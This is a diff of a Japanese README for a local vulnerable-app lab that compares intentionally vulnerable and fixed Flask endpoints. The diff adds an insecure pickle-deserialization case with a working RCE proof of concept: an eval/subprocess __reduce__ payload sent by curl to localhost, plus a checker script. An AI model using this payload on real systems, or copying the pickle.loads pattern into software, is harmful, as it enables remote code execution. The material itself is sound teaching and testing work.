@@ -4,8 +4,9 @@ Strix(AIエージェントによる自動ペンテスト)をローカル(Windows
 動かす一連の試み([`../strix-local-poc/windows-wsl-ollama-setup.md`](../strix-local-poc/windows-wsl-ollama-setup.md))
 と並行して、「発想を変えて、AIエージェントなしで脆弱性自体を実証する」ために作った最小限のラボ。
 当初はSQLiのみだったが、「Strixは他の脆弱性クラスも見る」という問いを受けてXSS、
-OSコマンドインジェクション・パストラバーサル・CSRF(クロスサイト・リクエスト・フォージェリ)、
-さらにアクセス制御の不備(IDOR/BOLA)にも対応範囲を広げた。
+OSコマンドインジェクション・パストラバーサル・CSRF(クロスサイト・リクエスト・フォージェリ)・
+アクセス制御の不備(IDOR/BOLA)、さらに安全でないデシリアライズによるRCE
+(リモートコード実行)にも対応範囲を広げた。
 
 Claude Codeのクラウドサンドボックス環境は外向きのLLM通信がほぼ全てブロックされているため
 (詳細は[`../strix-local-backend-notes.md`](../strix-local-backend-notes.md))、Strixのようなエージェント実行は
@@ -29,7 +30,8 @@ Claude Codeのクラウドサンドボックス環境は外向きのLLM通信が
     としての組み込みが現実的(例: `scan_all.sh`の出力が期待通りか`pytest`等で検証し、
     `summarize.py`互換のJSON/SARIFを吐かせてCIサマリに乗せる)。
 - `summarize.py`は現状Semgrep/Trivy/gitleaks/ZAPのJSON形式を前提にしている
-  ため、`auto_vuln_scanner.py`/`csrf_check.py`/`idor_check.py`の出力をその形式に変換する層が別途必要。
+  ため、`auto_vuln_scanner.py`/`csrf_check.py`/`idor_check.py`/`deserialize_check.py`の出力を
+  その形式に変換する層が別途必要。
 
 **次にこの話を再開するときは、ここを読むこと。** (2026-10-19 時点で未着手、との記録)
 
@@ -52,7 +54,7 @@ python3 auto_vuln_scanner.py --url http://8.8.8.8/login --class sqli --baseline 
 
 ## 対象アプリ
 
-[`vulnerable_app.py`](vulnerable_app.py): Flask + SQLite の最小アプリ。6種類の脆弱性クラスを含む。
+[`vulnerable_app.py`](vulnerable_app.py): Flask + SQLite の最小アプリ。7種類の脆弱性クラスを含む。
 
 - `/login`: 文字列連結でSQLを組み立てる、**意図的に脆弱**なエンドポイント(SQLi)
 - `/login_safe`: パラメータ化クエリ(プレースホルダ `?`)を使う、**修正済み**の同じ機能のエンドポイント
@@ -70,6 +72,11 @@ python3 auto_vuln_scanner.py --url http://8.8.8.8/login --class sqli --baseline 
   アカウント情報をそのまま返す、**意図的に脆弱**なエンドポイント(アクセス制御の不備/IDOR・BOLA)
 - `/idor_account_safe`: 要求された`user_id`がログイン中のセッション本人のものかを検証する、
   **修正済み**の同じ機能のエンドポイント
+- `/deserialize`: 受け取ったデータをそのまま`pickle.loads()`する、**意図的に脆弱**な
+  エンドポイント(安全でないデシリアライズ → RCE)。細工したpickleバイト列を送るだけで
+  サーバー上で任意のコードが実行される。
+- `/deserialize_safe`: `pickle`の代わりに`json.loads()`を使う、**修正済み**の同じ機能のエンドポイント
+  (JSONはコード実行の仕組みを一切持たない単純なデータ形式)
 
 起動:
 
@@ -216,6 +223,42 @@ curl -s -b cookies3.txt "http://127.0.0.1:5000/idor_account_safe?user_id=3"
 # => Forbidden: you may only access your own account.
 ```
 
+### 8. 安全でないデシリアライズによるRCE(`/deserialize`)
+
+これまでの脆弱性は「文字列として解釈されるはずの場所に、構文として解釈される文字が
+入り込む」という形だったが、これは違う。Pythonの`pickle`は、データだけでなく
+**「このオブジェクトをどう再構築するか(どの関数を何の引数で呼ぶか)」という手順そのもの**
+をバイト列に含められる。攻撃者はこの手順として任意の関数呼び出しを仕込める。
+
+```bash
+# 悪意あるpickleペイロードを作る(id コマンドを実行する __reduce__ を仕込んだオブジェクト)
+python3 -c "
+import pickle, base64
+class P:
+    def __reduce__(self):
+        return (eval, (\"__import__('subprocess').check_output(['id']).decode()\",))
+print(base64.b64encode(pickle.dumps(P())).decode(), end='')
+" > pickle_poc.b64
+
+curl -s -X POST --data-binary @pickle_poc.b64 "http://127.0.0.1:5000/deserialize"
+# => Deserialized object: 'uid=0(root) gid=0(root) groups=0(root)\n'
+```
+
+`pickle.loads()`を呼んだ瞬間に`id`コマンドが実際に実行され、その出力がHTTPレスポンスに
+そのまま返ってくる。「脆弱性がありそう」ではなく、**サーバー上でコードが実行された直接
+の証拠**が得られている。対策版(`/deserialize_safe`、`json.loads()`を使用)に同じ
+バイト列を送ると、JSONとして構文エラーになるだけで、コードは一切実行されない。
+
+```bash
+curl -s -X POST --data-binary @pickle_poc.b64 "http://127.0.0.1:5000/deserialize_safe"
+# => Error: Expecting value: line 1 column 1 (char 0)
+```
+
+JSONはデータの表現方法であり、どんな値を解釈しても「関数を呼ぶ」という動作には
+一切つながらない(pickleとの本質的な違い)。信頼できない入力をデシリアライズする際は、
+`pickle`/`yaml.load`(デフォルト設定)/Javaの素の`ObjectInputStream`等、
+「手順まで復元する」形式を避け、JSON等の**データのみ**を表す形式を使うのが鉄則。
+
 ## まとめ・学び
 
 - SQLiの本質(文字列連結でSQLを組み立てる = 入力がコードとして解釈される)は、
@@ -240,6 +283,10 @@ curl -s -b cookies3.txt "http://127.0.0.1:5000/idor_account_safe?user_id=3"
 [`idor_check.py`](idor_check.py): アクセス制御の不備(IDOR/BOLA)専用の別スクリプト。
 「悪意あるペイロード」ではなく「正当な自分のセッションのまま、他人のオブジェクトID(`user_id`)
 を指定する」という、*一見正常なリクエスト*が通ってしまうかを判定するため、これも専用の仕組み。
+
+[`deserialize_check.py`](deserialize_check.py): 安全でないデシリアライズ(RCE)専用の別スクリプト。
+攻撃コード入りのpickleペイロードを自分で組み立てて送信し、実行させたコマンド(`id`)の出力が
+レスポンスに現れるかで、PoCの成立を直接確認する。
 
 ```bash
 pip3 install --user requests
@@ -289,12 +336,19 @@ python3 idor_check.py --url http://127.0.0.1:5000 --account-path /idor_account
 
 # IDOR/BOLA: 修正版 /idor_account_safe をチェック(拒否されるはず)
 python3 idor_check.py --url http://127.0.0.1:5000 --account-path /idor_account_safe
+
+# デシリアライズRCE: 脆弱版 /deserialize をチェック
+python3 deserialize_check.py --url http://127.0.0.1:5000/deserialize
+
+# デシリアライズRCE: 修正版 /deserialize_safe をチェック(拒否されるはず)
+python3 deserialize_check.py --url http://127.0.0.1:5000/deserialize_safe
 ```
 
 ## まとめて1回で実行する
 
-[`scan_all.sh`](scan_all.sh): 上記12パターン(SQLi/XSS/コマンドインジェクション/パストラバーサル/CSRF/IDOR
-× それぞれ脆弱/修正)を1コマンドで実行するラッパースクリプト。`vulnerable_app.py`が起動済みであることが前提。
+[`scan_all.sh`](scan_all.sh): 上記14パターン(SQLi/XSS/コマンドインジェクション/パストラバーサル/CSRF/IDOR/
+デシリアライズRCE × それぞれ脆弱/修正)を1コマンドで実行するラッパースクリプト。
+`vulnerable_app.py`が起動済みであることが前提。
 
 ```bash
 python3 vulnerable_app.py &
@@ -317,6 +371,8 @@ python3 vulnerable_app.py &
 | CSRF | `/csrf_transfer_safe`(修正済み) | 1 | Not vulnerable(403で拒否) |
 | IDOR/BOLA | `/idor_account`(脆弱) | 1(他人のuser_id指定) | VULNERABLE(adminの機密情報が取得できる) |
 | IDOR/BOLA | `/idor_account_safe`(修正済み) | 1 | Not vulnerable(403で拒否) |
+| デシリアライズRCE | `/deserialize`(脆弱) | 1(攻撃コード入りpickle) | VULNERABLE(`id`コマンドの出力がレスポンスに漏洩) |
+| デシリアライズRCE | `/deserialize_safe`(修正済み) | 1 | Not vulnerable(JSON構文エラーで400、コード実行なし) |
 
 (パストラバーサルは3種のペイロードのうち1種のみ検出: この最小アプリは入力をそのまま
 `os.path.join`に渡すだけなので、URLエンコード済み(`..%2f`)や二重ドット変種(`....//`)の
@@ -326,9 +382,9 @@ python3 vulnerable_app.py &
 
 脆弱性クラスを追加する方法: 「GETパラメータにペイロードを注入してレスポンスを比較する」という型に
 合うクラス(SQLi/XSS/cmdi/traversal)なら`VULN_CLASSES`にペイロードリストと`detect()`関数を1組
-追加するだけ。CSRFやIDOR/BOLAのように型が違う(セッション状態を跨いだ判定が要る)クラスは、
-`csrf_check.py`/`idor_check.py`のように専用スクリプトを別途書く必要がある。いずれにせよ
-LLMの「判断」をルールで置き換えている分、
+追加するだけ。CSRF・IDOR/BOLA・デシリアライズRCEのように型が違う(セッション状態を跨いだ判定や、
+攻撃用バイト列の組み立てが要る)クラスは、`csrf_check.py`/`idor_check.py`/`deserialize_check.py`
+のように専用スクリプトを別途書く必要がある。いずれにせよLLMの「判断」をルールで置き換えている分、
 対応したいクラスの数だけ実装を増やす必要がある(これがStrixのような汎用エージェントとの根本的な
 違い — Strixは未知のケースにもLLMの推論で対応しうるが、このアプローチは既知のパターンにしか反応しない)。
 
